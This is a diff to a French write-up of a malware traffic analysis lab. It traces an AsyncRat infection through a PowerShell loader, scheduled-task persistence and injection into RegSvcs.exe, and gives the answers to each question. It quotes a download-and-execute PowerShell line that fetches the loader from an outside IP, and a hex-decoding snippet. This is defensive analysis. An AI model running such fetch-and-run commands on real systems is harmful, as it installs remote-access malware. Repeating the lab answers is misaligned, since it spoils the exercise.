@@ -47,6 +47,8 @@ Filtre Wireshark `http.request` : la victime `10.1.9.101` télécharge **2 fichi
 
 Le script `xlm.txt` **exécute une commande** (`IEX (New-Object Net.WebClient).DownloadString(...)`) qui télécharge le **stage du malware**. Ce n'est donc pas `xlm.txt` (le vecteur) mais le fichier qu'il récupère.
 
+![Full request URI mdm.jpg](screenshots/01-http-request-mdm-url.png)
+
 > ✅ **Réponse Q1 : `http://45.126.209.4:222/mdm.jpg`**
 > 🎯 ATT&CK : **T1105 – Ingress Tool Transfer**
 
@@ -55,6 +57,8 @@ Le script `xlm.txt` **exécute une commande** (`IEX (New-Object Net.WebClient).D
 ### Q2 — Hébergeur de l'IP
 
 Recherche threat-intel sur `45.126.209.4` (VirusTotal → Details → *AS Owner*, ou ipinfo.io) : AS 23470.
+
+![VirusTotal IP - ReliableSite.Net](screenshots/02-virustotal-ip-reliablesite.png)
 
 > ✅ **Réponse Q2 : `ReliableSite.Net`**
 
@@ -78,6 +82,14 @@ IEX (New-Object Net.WebClient).DownloadString('http://45.126.209.4:222/mdm.jpg')
 
 → `mdm.jpg` n'est **pas une image** : c'est un **script PowerShell** téléchargé puis exécuté en mémoire.
 🎯 ATT&CK : **T1059.001 (PowerShell)**, **T1027 (Obfuscated Files or Information)**
+
+On récupère le contenu via **clic droit sur `GET /mdm.jpg` → Follow → HTTP Stream** :
+
+![Follow HTTP Stream](screenshots/03-follow-http-stream-menu.png)
+
+Le flux révèle le `Content-Type: image/jpeg` (leurre) suivi du script PowerShell et de la chaîne `$hexString_bbb = "4D_5A_90_00…"` (`MZ` = exécutable) :
+
+![Contenu mdm.jpg - payload hex](screenshots/04-mdm-hexstring-payload.png)
 
 ### `mdm.jpg` — loader PowerShell (RunPE)
 
@@ -110,6 +122,8 @@ $bytes = $hex -split '_' | % { [byte][convert]::ToInt32($_,16) }
 Get-FileHash .\payload_bbb.bin -Algorithm SHA256
 ```
 
+![CyberChef - SHA256 du payload](screenshots/05-cyberchef-sha256.png)
+
 > ✅ **Réponse Q3 : `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798`**
 
 ---
@@ -120,6 +134,8 @@ Get-FileHash .\payload_bbb.bin -Algorithm SHA256
 
 Sur VirusTotal (hash Q3) → onglet **Detection** → ligne **Alibaba** : `Backdoor:MSIL/AsyncRat.2786761`. Les *Family labels* (`asyncrat`, `msil`, `marte`) et le *Popular threat label* `trojan.asyncrat/msil` confirment.
 
+![VirusTotal Detection - Alibaba AsyncRat](screenshots/06-virustotal-alibaba-asyncrat.png)
+
 > ✅ **Réponse Q4 : `AsyncRat`**
 
 ---
@@ -129,6 +145,8 @@ Sur VirusTotal (hash Q3) → onglet **Detection** → ligne **Alibaba** : `Backd
 VirusTotal → onglet **Details** → section **History** → *Creation Time*.
 (À noter : compilé le 30/10/2023, "First seen in the wild" le 11/01/2024.)
 
+![VirusTotal Details - Creation Time](screenshots/07-virustotal-compile-timestamp.png)
+
 > ✅ **Réponse Q5 : `2023-10-30 15:08`**
 
 ---
@@ -137,7 +155,9 @@ VirusTotal → onglet **Details** → section **History** → *Creation Time*.
 
 ### Q6 — LOLBin utilisé pour l'exécution furtive
 
-Le loader injecte le RAT dans un binaire .NET légitime de Windows (`RegSvcs.exe`), dont le chemin est reconstitué par concaténation (`'Mi'+'cr'+'osoft.NET\...'`) pour éviter la détection. Exécution **fileless** dans un processus signé Microsoft.
+Le loader injecte le RAT dans un binaire .NET légitime de Windows (`RegSvcs.exe`), dont le chemin est reconstitué par concaténation (`'Mi'+'cr'+'osoft.NET\...'`) pour éviter la détection. Exécution **fileless** dans un processus signé Microsoft. On le voit dans le script (variable `$AC` → `RegSvcs.exe`, puis `Execute($AC, $NKbb)`) :
+
+![Script - RegSvcs.exe + tâche planifiée](screenshots/08-script-regsvcs-scheduledtask.png)
 
 > ✅ **Réponse Q6 : `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`**
 > 🎯 ATT&CK : **T1218 (System Binary Proxy Execution)** + **T1055 (Process Injection)**
@@ -147,6 +167,8 @@ Le loader injecte le RAT dans un binaire .NET légitime de Windows (`RegSvcs.exe
 ### Q7 — Fichiers déposés par le script
 
 Le script écrit 3 fichiers dans `C:\Users\Public\` via `[IO.File]::WriteAllText(...)`, puis crée une tâche planifiée **"Update Edge"** qui exécute `Conted.vbs` **toutes les 2 minutes** (`PT2M`). Chaîne de relance : `Conted.vbs → Conted.bat → Conted.ps1 → ré-injection d'AsyncRat`.
+
+![Script - fichiers Conted déposés](screenshots/09-script-dropped-files.png)
 
 > ✅ **Réponse Q7 : `Conted.ps1, Conted.bat, Conted.vbs`**
 > 🎯 ATT&CK : **T1053.005 (Scheduled Task)**
